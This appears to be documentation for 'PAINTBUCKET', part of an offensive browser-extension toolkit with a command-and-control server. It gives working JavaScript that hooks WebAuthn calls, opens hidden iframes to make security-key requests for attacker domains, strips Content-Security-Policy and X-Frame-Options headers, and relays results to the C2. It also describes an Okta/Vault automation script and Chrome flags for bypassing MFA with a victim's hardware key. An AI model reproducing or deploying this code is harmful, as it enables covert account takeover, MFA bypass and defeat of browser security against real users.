# PAINTBUCKET - Web Injection & Authentication Bypass Component

## Overview
PAINTBUCKET is ChromeAlone's web content manipulation component that injects additional WebAuthn authentication requests into legitimate user authentication flows. Rather than intercepting existing credentials, it creates hidden iframes that silently perform WebAuthn requests to attacker-controlled domains whenever a user authenticates to any website.

## What is PAINTBUCKET?

PAINTBUCKET provides three core injection capabilities:
1. **WebAuthn Request Injection** - Creating hidden iframe requests that piggyback on legitimate user authentication
2. **Cross-Domain Authentication** - Leveraging user interaction to authenticate to one attacker site per legitimate authentication  
3. **Cross-Frame Communication** - Enabling coordination between injected content and extension components

## Technical Deep Dive

### Understanding WebAuthn (FIDO2) Authentication

#### WebAuthn Fundamentals
WebAuthn is a web standard for passwordless authentication that uses public key cryptography:

**Authentication Flow**:
1. **Challenge Generation** - Server creates a random challenge
2. **Credential Request** - Browser requests user authentication (biometric, PIN, hardware key)
3. **Cryptographic Response** - Authenticator signs the challenge with a private key

**Security Properties**:
- **Phishing Resistance** - Credentials are bound to specific origins (domains)
- **Replay Protection** - Each authentication includes unique challenge data
- **Hardware Binding** - Private keys are stored in secure hardware elements

#### PAINTBUCKET's WebAuthn Injection Framework

The system operates by injecting additional WebAuthn requests when legitimate authentication occurs:

**Step 1: Request Interception and Triggering**
```javascript
    // Override navigator.credentials.get to detect legitimate requests
    navigator.credentials.get = function(options) {
    console.log('🔑 WebAuthn GET Request Intercepted:', options);
    
    // Capture the legitimate request for analysis
    capturedRequests.push(serializeRequest(options));
    
    // Trigger additional WebAuthn requests in hidden iframes
    createWebAuthnIframeInOtherTabs();
    
    // Allow the original request to proceed normally
    return originalGet.call(this, options);
};
```

**Step 2: Hidden Iframe Creation**
When legitimate authentication is detected, PAINTBUCKET creates hidden iframes to target additional domains:
```javascript
function createWebAuthnIframe(site, request) {
    const iframe = document.createElement('iframe');
    // Create iframe with WebAuthn request encoded in URL
    iframe.src = "https://" + site + "/something/that/does/not/exist/?makewebauthnrequest=" + encodeURIComponent(request);
    iframe.allow = 'publickey-credentials-get';
    
    // Hide the iframe completely
    iframe.style.width = '0px';
    iframe.style.height = '0px';
    iframe.style.position = 'absolute';
    iframe.style.left = '-9999px';
    
    document.body.appendChild(iframe);
}
```

**Step 3: Cross-Domain Authentication Execution**
The hidden iframe loads with a specially crafted URL containing base64-encoded WebAuthn request data:
```javascript
// URL parameter processing in iframe context
const makeWebAuthnRequest = urlParams.get('makewebauthnrequest');
if (makeWebAuthnRequest) {
    // Decode and parse the WebAuthn request
    const requestOptions = JSON.parse(atob(makeWebAuthnRequest));
    
    // Stop normal page loading and execute WebAuthn request
    window.stop();
    document.documentElement.innerHTML = '<html><body><h1>🔑 Processing WebAuthn Request...</h1></body></html>';
    
    // Execute the WebAuthn request in this domain context
    navigator.credentials.get(requestOptions).then(credential => {
        // Send response back to C2 via extension messaging
        sendWebAuthnResponse(credential);
    });
}
```

### The Demo Okta Authentication Script

The `okta-idx-flow-automated.py` script demonstrates PAINTBUCKET's capabilities by automating a complete WebAuthn authentication flow against Okta's Identity Exchange (IDX) API. This script showcases how PAINTBUCKET can orchestrate complex authentication sequences that combine traditional credential submission with WebAuthn challenge-response cycles.

#### Script Architecture

**Core Components**:
1. **OAuth2/OIDC Flow Management** - Handles Vault → Okta → Vault authentication chain
2. **IDX API Integration** - Automates Okta's modern authentication API endpoints
3. **WebAuthn Challenge Processing** - Converts Okta challenges to browser-compatible format
4. **BATTLEPLAN Integration** - Uses the C2 infrastructure to execute WebAuthn requests
5. **Token Exchange Completion** - Retrieves final Vault client tokens

#### Key Functions

**`automate_okta_login()`** - Main orchestration function that:
- Initiates OAuth2 flow by requesting auth URL from Vault
- Follows redirects to establish session state with Okta
- Extracts state tokens and initializes IDX authentication
- Submits username/password credentials via IDX identify endpoint
- Triggers WebAuthn challenge through IDX challenge endpoint

**`format_idx_webauthn_challenge_for_browser()`** - Challenge conversion:
```python
# Extract challenge data from IDX response
challenge_info = current_auth.get('contextualData', {}).get('challengeData', {})
challenge = challenge_info.get('challenge')
credential_id = enrollment['credentialId']

# Format for navigator.credentials.get()
webauthn_request = {
    "publicKey": {
        "challenge": challenge,  # Base64url encoded
        "timeout": 60000,
        "rpId": rp_id,
        "allowCredentials": [{
            "type": "public-key",
            "id": credential_id,
            "transports": ["usb", "nfc", "ble", "hybrid"]
        }],
        "userVerification": user_verification
    }
}
```

**`make_webauthn_request()`** - BATTLEPLAN integration:
- Creates WebAuthn tasks via BATTLEPLAN C2 API
- Polls for completion using task management endpoints
- Returns structured WebAuthn response data for submission

**`submit_idx_webauthn_response_to_okta()`** - Response processing:
- Converts browser WebAuthn response to IDX API format
- Handles Okta-specific field mapping (e.g., `signatureData` vs `signature`)
- Manages session state and stateHandle progression

**`handle_success_redirect()`** - OAuth2 completion:
- Follows success redirects to complete authorization code flow
- Extracts authorization codes from callback URLs
- Automatically completes Vault token exchange via callback API

#### Platform-Specific Requirements

**Windows Chrome Configuration**:
On Windows systems, Chrome must be launched with specific flags to prevent Windows Hello from interfering with hardware security key operations:

```bash
chrome.exe --disable-features=WebAuthenticationUseNativeWinApi --do-not-de-elevate
```

**Why These Flags Are Necessary**:
- **`--disable-features=WebAuthenticationUseNativeWinApi`** - Prevents Chrome from using Windows' native WebAuthn API, which can conflict with direct hardware key access
- **`--do-not-de-elevate`** - Maintains elevated privileges necessary to bypass Windows Hello integration - without this permission Chrome will be unable to interact with USB hardware security tokens. A future solution to bypass Windows Hello without Admin is currently being investigated.

**Platform Behavior**:
- **Mac/Linux**: No special configuration required - hardware keys work normally
- **Windows**: Windows Hello enforcement is more rigorous about expected WebAuthn behavior and can block simultaneous hardware key requests

**Security Implications**:
- Admin permissions are required when running Chrome with these flags on Windows
- This configuration allows PAINTBUCKET to make multiple concurrent WebAuthn requests to the same hardware key
- Without these flags, Windows Hello will enforce single-request-per-key limitations that break the injection mechanism

#### Demonstration Flow

The complete demonstration sequence:
1. **Vault Auth URL Request** - Script requests OAuth2 authorization URL from Vault
2. **Okta Session Establishment** - Follows auth URL to establish session with Okta
3. **IDX Authentication** - Submits credentials through modern IDX API endpoints
4. **WebAuthn Challenge** - Receives and processes WebAuthn challenge from Okta
5. **PAINTBUCKET Execution** - Challenge converted and sent to BATTLEPLAN for hardware key interaction
6. **Response Submission** - WebAuthn response submitted back to Okta IDX
7. **OAuth2 Completion** - Authorization code exchanged for Vault client token

This demonstrates how PAINTBUCKET can be integrated into complex enterprise authentication workflows where multiple services (Vault, Okta, hardware tokens) must be coordinated to achieve full authentication bypass.

### Content Security Policy (CSP) Bypass

#### Understanding CSP Protection
Content Security Policy is a browser security mechanism that:
- **Restricts Resource Loading** - Controls which scripts, styles, and other resources can load
- **Prevents Injection Attacks** - Blocks inline JavaScript and eval() usage
- **Frame Control** - Manages iframe embedding with X-Frame-Options

**Common CSP Directives**:
```
Content-Security-Policy: 
    default-src 'self'; 
    script-src 'self' 'unsafe-inline'; 
    frame-ancestors 'none';
```

#### PAINTBUCKET's CSP Bypass Mechanism

The system uses Chrome's `declarativeNetRequest` API to modify HTTP headers:

**Step 1: Header Removal Rules**
```javascript
// Remove CSP headers that would block injection
const rules = [
    {
        id: 1,
        priority: 1,
        action: {
            type: "modifyHeaders",
            responseHeaders: [
                {
                    header: "content-security-policy",
                    operation: "remove"
                }
            ]
        },
        condition: {
            resourceTypes: ["main_frame", "sub_frame"]
        }
    }
];
```

**Step 2: Dynamic Rule Application**
The extension dynamically applies these rules to all web requests:
- Removes `Content-Security-Policy` headers
- Removes `Content-Security-Policy-Report-Only` headers  
- Removes `X-Frame-Options` headers
- Disables other injection prevention mechanisms

### Cross-Frame Communication Bridge

#### The Challenge of Browser Isolation
Modern browsers isolate different execution contexts:
- **Content Scripts** - Run in isolated worlds with limited DOM access
- **Main World** - Where legitimate website JavaScript executes
- **Extension Context** - Has elevated privileges but can't directly access page content

#### PAINTBUCKET's Communication Architecture

**Component 1: Main World Injection (`inject.js`)**
Runs in the same context as the target website:
```javascript
// Intercept WebAuthn calls in the main world
function interceptWebAuthnRequest(requestData) {
    // Send to isolated world via window messaging
    window.postMessage({
        type: 'MAIN_TO_EXTENSION',
        payload: {
            type: 'webauthn_request',
            data: requestData,
            requestId: generateRequestId()
        }
    }, '*');
}
```

**Component 2: Communication Bridge (`maintoisolated.js`)**
Runs in the isolated content script world:
```javascript
// Listen for messages from main world
window.addEventListener('message', (event) => {
    if (event.data.type === 'MAIN_TO_EXTENSION') {
        // Forward to extension background script
        chrome.runtime.sendMessage(event.data.payload, (response) => {
            // Send response back to main world
            window.postMessage({
                type: 'EXTENSION_TO_MAIN',
                messageId: event.data.payload.messageId,
                data: response
            }, '*');
        });
    }
});
```

**Component 3: Extension Background Processing**
Receives data with full extension privileges:
- Processes intercepted WebAuthn requests
- Communicates with C2 server
- Manages credential storage and replay
- Coordinates with other ChromeAlone components

### Cross-Domain WebAuthn Injection Implementation

#### Single Active Request Management
PAINTBUCKET maintains only one active WebAuthn request for injection at any time to simplify implementation and handle request expiration:
```javascript
// Extension background script tracks single active request
let activeWebAuthnRequest = null;
const targetDomains = [
    "attacker-site1.com",
    "attacker-site2.com", 
    "compromised-partner.com"
];

// When legitimate auth detected, replace any existing active request
function setActiveWebAuthnRequest(legitimateRequest) {
    // Replace previous request (lazy expiration)
    activeWebAuthnRequest = {
        timestamp: Date.now(),
        originalRequest: legitimateRequest,
        targetDomains: targetDomains,
        used: false
    };
    
    console.log('🔄 Active WebAuthn request updated, previous request replaced');
}

// Iframe creation uses the current active request
function createWebAuthnIframeFromActiveRequest() {
    if (!activeWebAuthnRequest || activeWebAuthnRequest.used) {
        console.log('❌ No active WebAuthn request available');
        return null;
    }
    
    // Mark as used and create iframe for first available domain
    activeWebAuthnRequest.used = true;
    const targetDomain = activeWebAuthnRequest.targetDomains[0];
    const customRequest = createWebAuthnRequestForDomain(targetDomain, activeWebAuthnRequest.originalRequest);
    
    return createWebAuthnIframe(targetDomain, btoa(JSON.stringify(customRequest)));
}
```

#### Authentication Piggybacking Process
When legitimate user authentication occurs:
1. **Trigger Detection** - Monitor for any WebAuthn request on the current page
2. **Request Storage** - Replace any existing active request with the new legitimate request data
3. **Context Preservation** - Maintain user interaction context for subsequent WebAuthn iframe usage
4. **Single Domain Execution** - Create one hidden iframe using the current active request
5. **Request Consumption** - Mark the active request as used to prevent duplicate usage
6. **Automatic Expiration** - New legitimate requests automatically replace older unused requests

**Implementation Note**: This single active request design simplifies the background script implementation by avoiding complex queue management and naturally handles request expiration. Since legitimate WebAuthn requests typically occur every few minutes during normal browsing, the system maintains a fresh active request while automatically discarding stale ones. This lazy expiration approach prevents memory accumulation and ensures the injected requests use recent, valid authentication contexts.

## Attack Capabilities

### Cross-Domain Authentication Injection
- **Single-Target Authentication** - Authenticate to one attacker domain per legitimate user authentication
- **Context Exploitation** - Leverage user interaction for WebAuthn permissions to attacker domains
- **Silent Registration** - Register new credentials on attacker sites without user awareness
- **Request Replacement** - Continuously update target domains by replacing older requests with newer ones
- **Multi-Factor Circumvention** - Bypass MFA by piggybacking on legitimate authentication sessions

### Content Manipulation
- **Injection Attacks** - Execute arbitrary JavaScript on any website
- **Phishing Enhancement** - Modify legitimate sites to capture additional data
- **UI Manipulation** - Alter webpage content to deceive users
- **Traffic Interception** - Monitor and modify all web communications

### Security Control Bypass
- **CSP Neutralization** - Disable Content Security Policy protections
- **Frame Breaking** - Bypass X-Frame-Options restrictions
- **Same-Origin Policy Violations** - Access cross-origin resources
- **Browser Security Feature Defeat** - Circumvent modern browser protections